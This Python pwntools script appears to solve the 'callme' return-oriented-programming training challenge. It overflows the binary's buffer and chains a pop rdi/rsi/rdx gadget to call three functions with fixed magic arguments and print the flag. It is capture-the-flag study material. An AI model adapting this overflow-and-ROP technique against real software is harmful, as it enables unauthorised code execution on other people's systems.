#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('callme')
p = process(elf.path)

gadget = p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret

callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

first_addr = p64(0xdeadbeefdeadbeef)
second_addr = p64(0xcafebabecafebabe)
third_addr = p64(0xd00df00dd00df00d)

argument = gadget
argument += first_addr  # pop rdi 
argument += second_addr # pop rsi
argument += third_addr  # pop rdx ; ret

xpl = b'A' * 40
# callme_one(first_addr, second_addr, third_addr)
xpl += argument
xpl += callme_one

# callme_two(first_addr, second_addr, third_addr)
xpl += argument
xpl += callme_two

# callme_three(first_addr, second_addr, third_addr)
xpl += argument
xpl += callme_three

print(xpl)

p.sendline(xpl)
print("[+] Flag: {}".format(p.recvall()))
